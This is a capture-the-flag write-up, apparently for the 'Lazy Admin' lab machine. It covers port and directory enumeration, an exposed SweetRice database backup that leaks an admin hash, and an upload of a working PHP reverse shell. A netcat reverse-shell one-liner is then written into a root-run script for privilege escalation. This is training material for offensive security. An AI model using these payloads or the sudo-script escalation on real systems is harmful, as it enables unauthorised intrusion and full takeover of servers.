## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Have some fun! There might be multiple ways to get user access.  
`Note: It might take 2-3 minutes for the machine to boot`
```

## IP_Address
```IP-Address
10.10.163.97
```
 
Lets start with RustScan
## RustScan
```bash
$ rustscan -a 10.10.163.97 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```

## Gobuster
```bash
$ gobuster dir -u http://10.10.163.97 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t4  -x php,txt,bak
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.bak             (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.bak        (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.163.97/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
Progress: 18976 / 18980 (99.98%)
===============================================================
Finished
===============================================================
```
We Found `http://10.10.163.97/content/`
then just start using burp on content directory
```bash
$ gobuster dir -u http://10.10.163.97/content/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30  -x php,txt,bak
/_themes     (Status: 301) [Size: 322] [--> http://10.10.163.97/content/_themes/]
/as          (Status: 301) [Size: 317] [--> http://10.10.163.97/content/as/]
/attachment (Status: 301) [Size: 325] [--> http://10.10.163.97/content/attachment/]
/changelog.txt        (Status: 200) [Size: 18013]
/images         (Status: 301) [Size: 321] [--> http://10.10.163.97/content/images/]
/inc            (Status: 301) [Size: 318] [--> http://10.10.163.97/content/inc/]
/index.php      (Status: 200) [Size: 2198]
/index.php      (Status: 200) [Size: 2198]
/js             (Status: 301) [Size: 317] [--> http://10.10.163.97/content/js/]
/license.txt    (Status: 200) [Size: 15410]
Progress: 18976 / 18980 (99.98%)
===============================================================
Finished
===============================================================
```
then on /content/as/ too using `Web-Browser`
and Got Files Like
```Files
404.php	
alert.php	
cache/	
close_tip.php	
db.php	
do_ads.php	
do_attachment.php	
do_category.php	
do_comment.php	
do_entry.php	
do_home.php	
do_lang.php	
do_rssfeed.php
do_sitemap.php
do_tags.php
do_theme.php
error_report.php
font/	------- Directory
function.php
htaccess.txt
init.php
install.lock.php
lang/ ------ Directory
lastest.txt
mysql_backup/ ----- Directory
rssfeed.php
rssfeed_category.php
rssfeed_entry.php
sitemap_xml.php
```
and when we look in directory `mysql_backup` we found
another file `mysql_bakup_20191129023059-1.5.1.sql`
and inside the the file we found
```bash
cat mysql_bakup_20191129023059-1.5.1.sql | grep "admin"
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```
we found credentials 
```Credentials
Admin     - manager
Hash      - 42f749ade7f9e195bf475f37a44cafcb  ///MD5 
Password  - [password omitted]
```
and also while using `gobuster` we found an login page  at http://10.10.163.97/content/as and using above credentials we login into the `Sweet Rice` and after Login got to 
dashboard > media setting > media upload `.phtml` will def. work
#php_reverseshell
```php        
<?php
$ip = '10.17.36.74'; // your attacker IP
$port = 4444;        // your listener port

$sock = fsockopen($ip, $port);
if ($sock) {
    $proc = proc_open("/bin/sh -i", [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ], $pipes);
}
?>
```
and then we surf on http://10.10.163.97/content/attachment/<filename>
and we got the Reverse shell 
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.163.97] 50256
/bin/sh: 0: can't access tty; job control turned off
$ whoami | id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami: write error: Broken pipe
$ whoami
www-data
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
[flag omitted]
```

Got the User Flag
```Flag
[flag omitted]
```

Also Found Interesting in Files
```bash
$ cat mysql_login.txt
rice:randompass
$ cat backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.36.74 5554 >/tmp/f
```
which is also an cron job and there is come plot too 
and After running/ Checking user `www-data` permissions I found
```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
I can run  /usr/bin/perl  /home/itguy/backup.pl with sudo which allow me to gain reverse sudo shell
and So I plotted reverse shell on the `/etc/copy.sh` cause backup.pl run the copy.sh which is run as root user
so 
```bash
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.36.74 5554 >/tmp/f" > /etc/copy.sh
```
And Run the command 
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```
and Got the root shell on my machine 
```bash
 nc -lvnp 5554
listening on [any] 5554 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.163.97] 60198
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
[flag omitted]
```
And Got the Root Flag
```Flag
[flag omitted]
```